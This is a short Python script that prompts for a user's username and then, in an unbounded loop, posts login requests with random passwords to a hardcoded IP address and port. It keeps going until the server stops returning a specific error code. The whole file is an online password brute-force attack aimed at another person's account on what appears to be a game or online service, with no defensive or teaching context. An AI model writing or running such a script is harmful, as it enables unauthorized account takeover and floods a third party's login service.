import requests
import random
import string

print("Enter user's Username")
user = input()

def generate_random_string():
   
    length = random.randint(8, 16)
    characters = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:',.<>?/"
    return ''.join(random.choices(characters, k=length))

def make_request():
    url = "http://103.195.100.145:35566/online/user/login"

    while True:
        
        randomint = generate_random_string()
        

        payload = {
            "alias": user,  
            "token": "ponkis16122",  
            "password": randomint
        }

        try:
            
            response = requests.post(url, json=payload)
            
            
            if response.status_code == 200:
                data = response.json()
                

                if data.get("error_type") == "007":
                    print(f"Error 007 encountered with randomint '{randomint}'. Retrying...")
                else:
                    print("Success! Response:", data)
                    break
            else:
                print(f"Request failed with status code {response.status_code}: {response.text}")
                break

        except Exception as e:
            print(f"An error occurred: {e}")
            break


make_request()
